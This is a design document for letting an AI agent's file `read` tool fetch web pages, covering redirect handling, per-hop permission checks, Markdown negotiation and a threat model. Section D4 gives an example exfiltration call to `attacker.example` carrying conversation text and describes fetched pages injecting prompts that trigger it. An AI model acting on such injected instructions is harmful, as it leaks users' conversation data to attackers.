## Context

See [proposal.md](proposal.md) for motivation and scope; the delta specs under
`specs/` are the behavior contract this design implements.

The substrate, on current `master`:

- `executeNative` resolves the `path` argument's scheme and dispatches
  `kb://` to `executeKnowledge` and `skill://` to `executeSkill`, then sends
  every other value through `parsePathScheme` to the native host path
  (`apps/api/src/tools/native-files.ts:63-78`). An unimplemented scheme fails
  closed with `invalid_path`, and a Run binds to the trusted executor identity
  on its first absolute-path operation; a `kb://` operation binds nothing.
  Web reads add a third dispatch branch and follow the `kb://` precedent for
  binding.
- Permission matching for native file tools runs one projection:
  `projectNativeFilePath` re-encodes Knowledge and skill locators to a
  canonical logical identity and returns every other value unchanged
  (`apps/api/src/tools/permissions/locator-projection.ts:26-53`), and
  `nativeFileProjection` applies it to the `path` field of `read`, `edit`, and
  `write`, including when an all-fields reject visits that field. An
  `https://` locator therefore reaches policy as the model's own text with no
  code change.
- `read`'s result contract is a bounded serialized object: `content`, the
  requested and shown range(s), `nextOffset`, `truncated`, `path`, and, for a
  linked host path, `realPath`
  (`packages/native-file-tools/src/source-lines.ts`,
  `packages/native-file-tools/src/stream-read.ts`). The selector grammar,
  context expansion, multi-range merge, and the shared 2,000-line ceiling live
  in the same package, and its trailing-selector split runs at the last colon
  after the last slash (`packages/native-file-tools/src/path.ts:262-274`) after
  the scheme prefix has been recognized.
- The `read` description is a packaged Handlebars template rendered per
  attempt (`apps/api/src/prompts/tools/read.md`). On `master` it names three
  targets (an absolute path, `kb://` under `{{#if tools.knowledge_search}}`,
  and `skill://`) and opens with a summary line that says the tool reads a
  local file. The web block needs no `{{#if}}` guard, because under D13 a web
  locator is reachable whenever `read` is advertised; it is a fourth target
  bullet plus a rewritten summary line, a redirect and `finalUrl` sentence,
  the port and encoded-colon notes, and the note that selectors address the
  rendered text.
- `apps/api` has no HTTP client of its own for tool traffic. The runtime is
  Node >= 22.19 (`package.json` engines), whose global `fetch` (bundled
  undici) supports `redirect: "manual"` and a streamed body with abort; the
  Codex model client is the in-repo precedent for the manual-redirect wrapper
  (`apps/api/src/models/openai-codex-model-client.ts:33-36`).
- The version llame reports on its own requests is read once at boot inside
  instance config by the in-flight `opencode-go-provider` change. That change
  is unmerged at this proposal's time; this design treats its version value as
  the single source and adds no second read.

## Goals / Non-Goals

**Goals:**

- Reach a public page through the tool the model already knows, with the same
  selectors, result bound, and permission group as a local file.
- Prefer what a publisher provides for agents before paying for a local
  conversion, and say which path produced the content.
- Keep every request bounded, attributable (`User-Agent: llame/<version>`),
  and individually admitted by operator policy, including each redirect hop.
- Add no configuration key, tool id, or availability condition.

**Non-Goals:**

- Address-level SSRF policy (#914), result snapshots or any cache (#915), PDF
  and image bodies (#916), and the repo-wide output-format question (#917).
- Site-specific handlers, a search tool, multi-URL aggregation, sub-model
  summarization, retries, `User-Agent` rotation, and publisher-signal
  compliance.

## Decisions

### D1: One locator surface on `read`, dispatched by scheme

- **Decision**: `read` accepts `http://` and `https://` beside absolute paths,
  `kb://`, and `skill://`, through a new branch in `executeNative` before the
  native-bound path. No new tool id, no `tools.allowed` entry, and no web
  configuration block. `edit` and `write` return `invalid_path` for a web
  locator. A web read requires and binds no native executor identity, offers
  no sibling suggestions, and treats a trailing separator as part of the URL.
  `read` becomes eligible for advertisement whenever it is allowlisted (D13),
  since a web locator needs no host authority. Restriction is the `read`
  permission group's `path` clauses over the
  submitted locator text.
- **Alternatives rejected**: a `web_fetch` tool (splits the selector, bound,
  and permission surface in two, adds a tool id and a `tools.allowed` entry,
  and repeats Codex's conflation lesson where users could not tell a fetch from
  a search); a `tools.allowed`-level gate (a second gate beside the permission
  group, which #913 explicitly excludes); a web configuration block (no
  operator decision needs a new key, because a `path` clause already expresses
  allow and reject over the whole locator).
- **Consequence**: a web read is reachable exactly where `read` is advertised
  and is judged by the same clauses as a file read, so a `read` group whose
  only allow covers `^/` rejects every URL and the operator opts in with one
  clause. A missing `tools.allowed` entry for a web host does not exist to
  forget, and no configuration becomes invalid.

### D2: No post-resolution address check

- **Decision**: the tool does not resolve a hostname to inspect its address
  before connecting. There is no loopback, link-local, RFC 1918, or ULA check;
  a `path` clause over text is the only barrier. #914 owns address evaluation.
- **Alternatives rejected**: a hostname denylist for `localhost`, `*.local`,
  and `*.internal` (bypassable by any name the operator did not list, and it
  suggests a boundary text cannot provide); resolving each hop and evaluating a
  synthesized address locator (it changes matching semantics, needs a resolver
  seam and a multi-answer rule, and races the connection; #914 is exactly that
  design).
- **Consequence**, stated plainly: a hostname rule cannot see the resolved
  address. A page whose hostname resolves to `127.0.0.1`, a private range, or
  a cloud metadata address passes any `path` clause that admits its name, and
  an answer that changes between the decision and the connection passes too; a
  redirect chain reaches those addresses the same way. The delta spec states
  this as behavior so a later fix has a test to change, and `docs/web-read.md`
  records the threat model: the operator should keep the `read` group tight,
  because the tool is reachable from model-authored text.

### D3: Redirects are followed, and each hop is admitted

- **Decision**: a web read follows 301, 302, 303, 307, and 308 responses on
  any host, up to 20 in total per call, with `redirect: "manual"` so the tool
  owns the loop, and sends no cookie or credential on any request. The hop
  locator is the `Location` value resolved against the redirecting request's
  URL by the WHATWG URL parser and serialized as its `href` (lowercase
  punycode host, default port dropped, empty path as `/`, path and query
  percent-encoded, fragment retained); a redirect without a parsable
  `Location`, or a resolved locator with userinfo or a non-`http(s)` scheme,
  fails the call with `invalid_redirect` before any request and without
  repeating the target. Every derived locator (a hop, an announced alternate,
  a suffix candidate, an `llms.txt` candidate) is evaluated against the
  `read` permission group before its request through the same evaluator and
  projection the call used, as if the model had submitted it: a rejected hop
  ends the call with a `permission_denied` error whose message is a fixed
  template and whose result carries the locator as `rejectedUrl`, bounded to
  2,048 characters with control characters removed (the shared `ToolResult`
  error variant in `packages/runtime-safety` gains that optional field); a
  rejected probe locator only disqualifies its candidate, so a hostile page
  cannot make reads of itself fail by announcing a refused alternate. The
  rejected target's body is never read. The executor hands each
  derived-locator decision to run execution through a trusted callback on
  the tool context that `run-execution.service.ts` constructs; run execution
  already owns the call decision it receives from the runner's `onAdmitted`
  and writes to the completion payload, and it records the derived-locator
  decisions beside it when the call settles, so tool activity, the stored
  tool-part metadata, and `assistant-transcript.ts`'s durable reconstruction
  all read them from the one payload. The result reports `finalUrl` and no
  hop chain, and the `read` description says redirects are followed and that
  `finalUrl` reports where the content came from.
- **Alternatives rejected**: automatic `redirect: "follow"` (hops become
  invisible, so no rule can decide between requests and a rejected target
  would be fetched before any check); returning cross-host redirect metadata
  for the model to re-issue, the Claude Code shape (costs a round trip,
  exposes the hop to the model, and llame's tool loop has no per-hop
  affordance); refusing cross-host hops outright (breaks canonical-host and
  docs redirection, and #913's acceptance requires a 302 to a rejected host to
  end with a rejection, not a refusal to follow).
- **Consequence**: one call can issue at most 27 requests (D7), all inside
  the single 30 s budget. A rejected hop leaves an error observation rather
  than partial content, so a half-read page is never presented as an answer.
  Hop records add bounded metadata (at most 20 entries) to the settled part,
  under the rule that already excludes decision metadata from model replay,
  public shares, exports, and search; a call that never settles loses its hop
  records with its result, which is the same durability the result has.
  Recording at settlement keeps the executor free of a mid-call durable write
  path, and the callback keeps hop decisions out of the model-visible
  `ToolResult`. The error type is the existing `permission_denied`, so
  consumers handle one permission error; the message distinguishes a hop.
  Because the hop locator is chosen by the redirecting server, it is
  attacker-controlled text; it therefore travels in a bounded structured
  field rather than inside the fixed message, which keeps the permission
  requirement's no-interpolation rule intact. Policy sees the parser's
  serialization of a hop (lowercase host, default port dropped), so the
  runbook tells operators to write hop-relevant rules against that form.

### D4: No URL-provenance rule and no additional packaged notice

- **Decision**: trust framing stays where it is today: the tool-calling
  capability's generic treatment of tool output as untrusted, plus the `read`
  description. No "the URL must have appeared earlier in the conversation"
  rule, and no new packaged notice for fetched content.
- **Alternatives rejected**: the Claude API's provenance restriction (it bounds
  exfiltration by a model that invents URLs, but it is a server-side
  conversation rule, it cannot be evaluated per hop, and it would break the
  "read the page I just named" flow #913 asks for); a packaged untrusted-text
  banner on each web result (duplicates framing that already exists, inflates
  every result against the shared bound, and belongs to the format decision in
  #917).
- **Consequence**: a page's text reaches the model under the same framing as a
  Knowledge read, so a prompt injected by a fetched page has the standing of
  any other tool output and no llame-side signal distinguishes it. The
  outbound direction is accepted too: a GET's path and query are
  model-authored, so under the recommended policy
  `read https://attacker.example/?d=<conversation text>` is one admitted call
  that leaves the process, and a page or Knowledge file can instruct it. The
  operator's `read` group is the boundary in both directions; the runbook
  names both threats.

### D5: No cache

- **Decision**: nothing is cached between calls. A selector read refetches and
  rerenders; a second read of the same locator issues a new request.
- **Alternatives rejected**: a session-scoped URL cache with a TTL (OpenClaw
  and Claude Code both use 15 minutes), which makes two reads of one locator
  disagree by timing and forces the tool to explain staleness it cannot
  observe; an artifact-backed snapshot of the fetched body, which is the better
  answer and is #915.
- **Consequence**: the same caveat a local file already carries when it
  changes under a read; the tool never claims two reads agree. Paging a long
  page costs one request per selector call, inside the same bounds, and the
  model that wants several windows from one page is the case #915 exists for.

### D6: Publisher signals are ignored

- **Decision**: `robots.txt` and `content-signal` are not consulted, and their
  presence is not reported. The operator's `read` group is the only gate.
- **Alternatives rejected**: honoring `robots.txt` per fetch (an extra request
  per origin, a parser, a per-agent interpretation, and a rule the operator
  could not enforce anyway once any other client is installed);
  honoring `content-signal` (a publisher preference about AI processing that
  llame cannot map onto one owner's private read of a public page, and one that
  changes without notice).
- **Consequence**: the model can read a page whose publisher asked automated
  clients not to. An operator who wants that respected adds a `path` reject for
  the host, which the shipped example demonstrates with its grokipedia clause.

### D7: Bounds and status handling

- **Decision**: 10 s to response headers (`headers_timeout`), 30 s total for
  the call across every request it issues (`call_timeout`), a 5 MiB streamed
  body cap aborted with `body_too_large`, and no retries. A non-2xx status
  other than a followed redirect status on the first request or a hop fails
  the call with `http_status` naming the status, and a 429 also carries
  `Retry-After` when present; a probe's non-2xx status or refused content
  type only disqualifies that candidate,
  because the suffix probe and the `llms.txt` walk expect 404 as their
  ordinary answer. Request count per call is bounded: one alternate, one
  suffix probe, four `llms.txt` candidates, and 20 redirects in total
  (`too_many_redirects`), so at most 27 requests. Only `http` and `https` are
  admitted, userinfo in the locator fails `invalid_path`, and
  `Accept-Encoding` is left to the runtime.
- **Alternatives rejected**: retrying transport failures or 429 (hidden
  latency inside a fixed budget and a duplicated request for a server that
  already answered; omp retries 429 once and rotates three user agents on
  block detection, which is bot evasion); a per-surface fetch timeout setting
  (no operator decision needs one, and the peer tools cluster at 10-30 s);
  buffering the body before measuring it (an unbounded allocation under a
  hostile or broken server); declaring a `Content-Length` cap only (chunked
  responses declare nothing).
- **Consequence**: one slow origin consumes the whole call budget, and a
  partial page is never returned as content. The model sees the server's own
  `Retry-After`, so it can continue with other work rather than being told to
  wait an amount llame invented. Cleartext `http://` stays an operator
  decision: the tool admits the scheme and the recommended policy rejects it.

### D8: Text bodies only, with three-step charset resolution

- **Decision**: the accepted set is `text/*`, `application/json`,
  `application/xml`, and any subtype with a `+json` or `+xml` suffix;
  `text/markdown` is handled as Markdown. Everything else fails with
  `unsupported_content_type` naming the received type. A `text/plain` body
  that is HTML-shaped follows the HTML path; any other non-HTML text body is
  returned unchanged. Charset comes from the `Content-Type` parameter, else a
  `<meta charset>` declaration in the first 2 KiB, else UTF-8.
- **Alternatives rejected**: accepting every content type and letting the model
  deal with the bytes (`application/octet-stream` and PDF bodies would arrive
  as mojibake under a conversion path that cannot read them; #916 decides
  whether a document library earns its dependency); trusting the
  `Content-Type` charset alone (many pages declare none); refusing `text/plain`
  (plain-text and Markdown pages are the feature's best case).
- **Consequence**: a PDF or image URL fails visibly with its type named, which
  is the evidence #916 asks for. No binary path enters the tool, and the
  quality gate never sees a body it cannot decode.

### D9: Publisher Markdown first, then a bounded local pipeline

- **Decision**: one ordered pipeline, described in
  [The adapter pipeline](#the-adapter-pipeline): negotiate with
  `Accept: text/markdown, text/plain;q=0.9, text/html;q=0.8, */*;q=0.5` on
  the first request, then the announced alternate, then the Markdown suffix
  probe, then a local Readability and Turndown render, then the `llms.txt`
  walk only after that render fails the gate, then the raw body with a note.
  Plain text ranks above HTML so a server that can serve both hands over text
  that needs no conversion (omp's negotiation retry uses the same order); the
  trade is that a negotiated plain variant carries no links or headings,
  which the model can recover with `:raw` or by reading the announced
  alternate. Alternates, suffix candidates, and `llms.txt` candidates are
  derived locators admitted by policy before their request (D3). `:raw`
  returns the final response body untouched.
- **Alternatives rejected**: rendering locally first (it discards the
  publisher's own Markdown, which is higher fidelity and cheaper to read; every
  peer harness renders locally, so the negotiation is this change's
  differentiator); probing `llms.txt` before the local render (a walk costs up
  to one request per path segment and usually finds nothing, so only a failed
  render justifies it); site-specific handlers (omp ships about eighty of them,
  a maintenance surface with no owner here); `html-to-text` instead of Turndown
  (loses structure, and Gemini CLI's choice drops tables and links); accepting
  an announced alternate without the gate (a site can announce a stub or an
  error page).
- **Consequence**: a page that publishes Markdown costs one request; a typical
  docs page costs two or three, and a hard case costs the hop budget plus one
  probe per ancestor segment plus the local render, all inside the shared 30 s
  and 5 MiB limits. `method` makes the chosen path visible to the operator and
  the model, and gives the fixture-server test a way to assert both the
  sequence and the request count.

### D10: `User-Agent: llame/<version>`, no rotation

- **Decision**: every web request carries `User-Agent: llame/<version>`, where
  the version is the boot-time value instance configuration resolves. No
  rotation, no randomization, no browser impersonation. A challenge page is not
  circumvented: it fails the quality gate and is returned with a note.
- **Alternatives rejected**: omp's three-user-agent rotation advancing on
  block detection (evasion, and behavior that changes with a publisher's
  heuristics); a browser-like user agent (claims another product's identity,
  which `opencode-go-provider` forbids for llame's own requests); omitting the
  header (the runtime's default identifies nothing, and a publisher filtering
  by agent string would treat llame as an anonymous client).
- **Consequence**: a publisher that blocks unknown agents blocks llame, and the
  model learns that from the note rather than from a fabricated success. The
  version value is the one instance-config seam the `opencode-go-provider`
  change adds; this change reads it there and nowhere else.

### D11: The example keeps `read` open and adds two rejects

- **Decision**: `apps/api/llame.config.json.example` keeps
  `"read": { "allow": true }` and gains two case-insensitive `read.path`
  rejects: `(?i)^http://` and grokipedia with its subdomains and a trailing
  dot. Submitted locators are matched verbatim while the scheme dispatch
  lowercases, so `HTTP://` would otherwise slip past a case-sensitive clause.
  The new `docs/web-read.md` runbook shows
  the narrower alternative, replacing the whole-tool allow with field allows
  for `^/`, `^kb://`, `^skill://`, and `^https://docs\.example\.com/`, and the
  recommended-policy requirement names both rejects and the alternative.
- **Alternatives rejected**: shipping a domain allowlist as the default (the
  recommended map is copied whole, so a `read` group with only a URL clause
  would reject every local path and every `kb://` locator for any operator who
  copied it); leaving the example unchanged and documenting enablement only in
  the runbook (the capability would be off in the shipped configuration and no
  check would notice); allowing cleartext HTTP by default (it gives up
  transport security for a public read while the model can always be given the
  `https://` form).
- **Consequence**: an operator who copies the example and adds `read` to
  `tools.allowed` (the example allowlists only `search_conversations`) admits
  public HTTPS reads and refuses cleartext and grokipedia. The narrower policy
  is one edit the runbook shows, and the delta spec's scenario proves it
  rejects every other authority rather than silently admitting one.

### D12: Result shape

- **Decision**: the native read success object — `content`, the requested and
  shown range or ranges, `nextOffset`, `truncated`, and `path` as the locator
  with its selector stripped, as a local read reports it —
  plus `finalUrl`, `method`, and `notes` only when non-empty. No `url`,
  `contentType`, `markdownTokens`, text header, or frontmatter, and no
  `realPath`. The rendered text is measured against the existing native result
  bound, which reserves space for the envelope fields first. Line selectors
  apply to the rendered text exactly as to a local file.
- **Alternatives rejected**: the text header omp prepends
  (`URL:`/`Content-Type:`/`Method:`/`Notes:` above the body), which puts
  non-source text in front of content the model may paste into `edit oldText`;
  adding `contentType` or `markdownTokens` for observability (no consumer uses
  them, and #917 owns the field set); a separate web result type (the tool's
  result shape, part renderer, and JSON-reading rule would fork for one source
  kind).
- **Consequence**: a web read is the shape the tool already returns, so paging,
  truncation, and the renderers work unchanged; `method` is the only new
  observability and is what the acceptance rows assert. Because nothing is
  cached, a truncated render is gone when the call ends; #915 owns restoring
  it.

### D13: `read` is advertised whenever it is allowlisted

- **Decision**: the advertisement condition for `read` drops its authority
  clause: `read` is eligible whenever `tools.allowed` names it. `edit` and
  `write` keep the existing condition (accepted native host authority or a
  configured Knowledge root). An absolute path on a process without accepted
  native authority still fails closed with `executor_unavailable`, and
  `kb://` without a Knowledge root still fails as it does today.
- **Alternatives rejected**: leaving the condition unchanged (a process with
  neither native authority nor a Knowledge root nor skill sources could never
  read a URL, which turns three unrelated settings into an undocumented web
  gate); adding a web-specific advertisement condition (a fourth authority
  flag for a locator that needs none).
- **Consequence**: an operator who allowlists `read` on a bare API process
  gets a `read` tool that serves web and, when configured, skill locators, and
  refuses absolute paths with the existing error. Existing installs see `read`
  advertised in one more configuration, with no new reachable authority. The
  same sentence lives in `tool-calling`'s "Tool registry with mandatory safety
  classification", which the in-flight `knowledge-submit` change also
  modifies; the change that finalizes second reconciles both deltas by hand
  before sync (`tasks.md` 4.2).

## The adapter pipeline

Ordered, for an HTML first response and without `:raw`. Every step requests
with the same `Accept` header, under the same bounds, headers, per-hop
admission, and redirect rules as the first request; a probe's non-2xx status
or refused content type disqualifies that candidate and the pipeline
continues.

1. **Negotiation.** The first request sends
   `Accept: text/markdown, text/plain;q=0.9, text/html;q=0.8, */*;q=0.5`. A
   `text/markdown` body, or a `text/plain` body that is not HTML-shaped, is
   the content as served, ungated and unconverted: `method: "negotiated"`.
2. **Announced alternate.** A Markdown URL announced by the response's `Link`
   header or by a `<link rel="alternate" type="text/markdown">` element in the
   head is fetched: `method: "alternate"`.
3. **Markdown suffix probe.** `/a/b.html` is tried as `/a/b.html.md`, `/a/b` as
   `/a/b.md`, and `/a/b/` as `/a/b/index.md`: `method: "md-suffix"`.
4. **Local render.** Readability's main-content extraction, converted with
   Turndown and GFM tables; the whole body is converted when Readability finds
   no article: `method: "readability"`.
5. **`llms.txt` walk.** Only after the local render fails the quality gate, at
   most four candidates from the deepest path segment up to the site root
   (the three deepest scopes and the root): `method: "llms-txt"`. An index
   file is short link lines by construction, so a candidate is accepted on
   length and not-HTML-shaped alone, as omp's `tryLlmEndpoints()` does.
6. **Raw body.** The last resort is the response body with a note:
   `method: "raw"`.

The quality gate applies to steps 2-4: more than 100 non-whitespace
characters, not HTML-shaped for a Markdown candidate, and not low quality,
where low quality means under 1,024 characters containing a JavaScript or
captcha gate phrase, or more than 70 percent of non-blank lines shorter than
40 characters. The first candidate that passes wins and ends the search.

A text body outside the negotiation set (JSON, XML, other `text/*`) skips the
pipeline and is returned unchanged as `method: "text"`. `:raw` skips every
step and returns the first response body untouched.

## Dependencies

- `@mozilla/readability` (Apache-2.0): main-content extraction in step 4.
- `turndown` (MIT) and `turndown-plugin-gfm` (MIT): HTML to Markdown with GFM
  tables, in step 4 and nowhere else.
- `linkedom` (ISC): the DOM the two above run against. A proposal-time spike
  task (`tasks.md` 2.1) confirms Readability runs on a linkedom document before
  the dependency is committed; if it does not, `jsdom` (MIT) replaces it and
  the license line changes before any adapter code is written.
- No HTTP dependency is added: the runtime's global `fetch` (Node >= 22.19,
  bundled undici) provides `redirect: "manual"` and streamed bodies with abort.
- One value is consumed rather than added: the boot-time version read for
  `User-Agent: llame/<version>`, which the in-flight `opencode-go-provider`
  change places in instance config. No second version read is implemented.

## Prior art

Facts gathered from primary sources; the peer report is at
`~/.omp/agent/local/webfetch-peers.md` and the omp report at
`~/.omp/agent/local/webfetch-omp.md`.

- **omp** (`can1357/oh-my-pi@main`, `packages/coding-agent/src/tools/fetch.ts`,
  `packages/coding-agent/src/web/scrapers/{types,utils,index}.ts`,
  `docs/tools/read.md`) tries an in-body `<link rel=alternate>` Markdown URL,
  then a `.md` suffix probe, then a re-fetch with
  `Accept: text/markdown, text/plain;q=0.9, text/html;q=0.8`, then feed
  alternates, then a reader-backend chain, then an `llms.txt` walk, then the
  raw body; its reader-backend gate is `>100` non-whitespace characters plus
  a low-quality test at `<1024` characters with JavaScript/captcha phrases or
  `>70%` short lines, while its `llms.txt` walk applies only the length and
  not-HTML test; it sets `Accept-Encoding: identity` because
  "Cloudflare Markdown-for-Agents returns corrupted bytes when compression is
  negotiated"; it rotates three user agents on block detection, retries 429
  once honoring `Retry-After` up to 10 s, caps bodies at 50 MB, performs no
  private-address check, prepends a `URL:`/`Content-Type:`/`Method:`/`Notes:`
  header, and spills truncated output to session artifacts.
- **OpenClaw** (`docs.openclaw.ai/tools/web-fetch`) runs Readability with an
  optional Firecrawl fallback, blocks private hosts pre-flight and re-checks
  every redirect hop, pins DNS, caches for 15 minutes, caps the body at
  750,000 bytes and the output at 20,000 characters, and wraps results in an
  `externalContent` marker with a temp-file spill; its `web_fetch` takes no
  prompt.
- **Gemini CLI** (`google-gemini/gemini-cli`,
  `packages/core/src/tools/web-fetch.ts`) converts HTML with `html-to-text`,
  caps the fallback at 10 s, 10 MiB, and 250,000 characters, limits a host to
  10 requests per minute, and blocks localhost, `.local`, `.internal`, and
  private resolved addresses — the check this change defers to #914.
- **Claude Code** (`code.claude.com/docs/en/tools-reference`) requires a
  `prompt`, converts with Turndown, summarizes through a small model, caches
  15 minutes, returns cross-host redirects as metadata instead of following
  them, and checks domains against a server-side `domain_info` deny-list.
  **Claude's API `web_fetch`** (`platform.claude.com` docs) accepts only a URL,
  supports `allowed_domains` XOR `blocked_domains`, and rejects a URL that has
  not already appeared in the conversation (`url_not_in_prior_context`).
- **Codex CLI** has no client-side fetch: issue #3984 remains open and #7390
  was closed as not planned after users could not distinguish a search from a
  fetch — evidence that one surface per capability is the safer shape.
- **Standards**: llmstxt.org v2 defines the `.md` suffix probe and the `Link`
  relation used in steps 2 and 3; Cloudflare's Markdown for Agents documents
  `Accept: text/markdown`, `x-markdown-tokens`, and `content-signal`; Blume's
  markdown and agent-discovery documentation is the negotiating client's
  reference. No inspected harness queries a publisher's Markdown at all — each
  one converts HTML locally — so the ordering above is grounded in those
  standards rather than in a peer implementation.

## Risks / Trade-offs

- [Readability may not run on linkedom] → the spike task runs Readability
  against a linkedom document before the dependency is committed; `jsdom` is
  the fallback, and the license and bundle-size line is updated before any
  adapter code exists.
- [The version seam is owned by an unmerged change] → the `fetch` layer
  consumes the instance-config value and implements no second read; if the seam
  has not landed at the layer boundary, the layer starts from that seam rather
  than inventing one.
- [No address check, and a hostile page can name a private target] → stated in
  the design, the delta spec, and the runbook; the operator's `read` group is
  the boundary and #914 owns the fix.
- [A rejected hop ends the call with no partial content] → deliberate: partial
  content would hide that the answer is incomplete. The error names the host,
  the operator fixes policy, and the model re-runs the call.
- [Hop metadata adds rows to tool activity] → bounded by the 20-hop limit and
  carried by the existing owner-scoped record, which the existing rule already
  excludes from replay, shares, exports, and search.
- [Publisher Markdown quality varies] → the shared gate plus `method` in the
  result makes the chosen path visible, and `:raw` is the model's escape hatch
  when a conversion is wrong.
- [The 30 s budget is shared across hops and probes] → the ordering puts the
  cheapest, highest-fidelity candidate first, so a slow site fails at the first
  or second request rather than after a speculative walk.
- [Cloudflare reports corrupted bytes when compression is negotiated with
  Markdown for Agents] → the implementation re-tests that case against the
  acceptance URL; if it reproduces, `Accept-Encoding: identity` is the one-line
  fallback and the fixture test covers the decision.
- [The "HTML-shaped" test can misfire on a text body that begins with markup] →
  one heuristic decides both the negotiation case and the gate, and a misfire
  still returns the body under the same result shape with `method` naming the
  path taken.
- [A fetched page can carry a prompt injection] → accepted under D4: the
  generic untrusted-output framing and the operator's policy are the boundary,
  and this change adds no notice of its own.

## Migration Plan

Additive and configuration-only. No key, tool id, schema, database migration,
or stored-data change; no existing behavior changes except for an operator who
copies the updated example, which now rejects cleartext HTTP reads and
grokipedia. Those two rejects are called out in the changelog entry and the
runbook. Rollback is a permission edit or the removal of the locator branch;
historical runs keep their recorded results, and no queued work depends on the
new path.

## Revision history

- v1 (2026-09-21): Initial proposal for #913, from the settled decisions
  D1-D13. Records the adapter order against llmstxt.org v2 and Cloudflare
  Markdown for Agents with plain text ranked above HTML in `Accept` (Leo's
  first-read change), the shared quality gate taken from omp's pipeline, the
  peer survey's redirect and SSRF comparison, the four new `apps/api`
  dependencies with licenses and the linkedom spike, the single version seam
  the `opencode-go-provider` change owns, and the four deferrals with their
  issues (#914, #915, #916, #917).
- v2 (2026-09-21): Adversarial review round 1 (two independent reviewers,
  21 findings, all accepted). Contract fixes: a negotiated body is ungated and
  `method: "text"` is scoped to bodies outside the negotiation set; probe
  failures disqualify the candidate instead of the call; `llms.txt`
  candidates are judged on length and shape only, as omp does; request and
  redirect budgets are per call (27 requests at most); named error types
  `headers_timeout`, `call_timeout`, `http_status`, `too_many_redirects`,
  `invalid_redirect`; the hop locator is the WHATWG serialization of the
  resolved `Location`, userinfo or non-web hops fail closed, and the rejected
  locator travels in a bounded `rejectedUrl` field rather than inside the
  fixed message; hop decisions reach the runner through a trusted tool-context
  callback; `path` is reported with the selector stripped; a literal colon in
  the last path segment must be encoded. Layering: the `fetch` layer does not
  follow redirects, so `master` never carries unguarded hop following between
  merges. Corrections: the llmstxt.org acceptance row yields `md-suffix`
  (the site serves `/index.md`), the Readability example is a Wikipedia
  article, the `read.md` placeholder claim is replaced with the template's
  actual structure, D4 states the outbound exfiltration consequence, D11 says
  `read` must also be allowlisted, and the proposal names the candidate
  resolver and portable policy fixture.
- v3 (2026-09-21): Adversarial review round 2 (two independent reviewers,
  15 findings, all accepted; MODIFIED blocks re-verified lossless). Followed
  redirect statuses are named and take precedence over `http_status`; a
  redirect without a parsable `Location` fails `invalid_redirect`; every
  derived locator (hop, alternate, suffix, `llms.txt`) is admitted by policy
  before its request, a rejected probe disqualifying only its candidate; the
  hop serialization note lists punycode, percent-encoding, and fragment
  retention; F5 and F6 are case-insensitive and F6 covers a trailing dot,
  because submitted locators are matched verbatim while the scheme dispatch
  lowercases; `rejectedUrl` is declared as an optional field on the shared
  `ToolResult` error variant; the provenance seam is run execution's
  completion payload, not the runner; the candidate resolver is
  `knowledge-tool-candidate-resolver.ts`; `:raw` returns the final response
  after hops; `path` is selector-stripped in the requirement text; the
  `fetch` layer ships neither hops nor probes, so no derived locator is
  fetched before its admission exists; the non-breaking claim is qualified
  by D13; and the `knowledge-submit` reconciliation names the
  `knowledge_submit` classification sentence and scenario it must keep.
